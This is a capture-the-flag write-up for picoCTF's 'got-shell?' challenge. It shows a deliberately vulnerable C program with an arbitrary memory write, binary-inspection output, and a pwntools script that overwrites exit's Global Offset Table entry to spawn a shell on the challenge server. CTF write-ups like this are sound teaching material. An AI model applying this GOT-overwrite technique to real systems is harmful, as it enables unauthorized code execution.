got-shell? - Points: 350
===========

## Description

>Can you authenticate to this service and get the flag? Connect to it with nc 2018shell1.picoctf.com 23731

## Hint:

> * Ever heard of the Global Offset Table?

## Vulnerable Code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

void win() {
  system("/bin/sh");
}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[256];
  
  unsigned int address;
  unsigned int value;

  puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");

  scanf("%x", &address);

  sprintf(buf, "Okay, now what value would you like to write to 0x%x", address);
  puts(buf);
  
  scanf("%x", &value);

  sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
  puts(buf);

  *(unsigned int *)address = value;

  puts("Okay, exiting now...\n");
  exit(1);
  
}
```

## Useful Information

$rabin2 -R got-shell |grep exit
> * vaddr=0x0804a014 paddr=0x00001014 type=SET_32 exit

nm got-shell|grep win 
> * 0804854b T win

## Exploit

**REQUIRE** :[Pwntools Python](https://github.com/Gallopsled/pwntools)

**Give the address of win as content and the addresss of exit as destination :**

```python
#!/usr/bin/python2.7
from pwn import *
import time,sys

exit="0804a014"
win="0804854b"
rem = remote("2018shell3.picoctf.com",23731)
rem.recv(4096)

rem.sendline(exit)
rem.recv(4096)
rem.sendline(win)

rem.interactive()
```


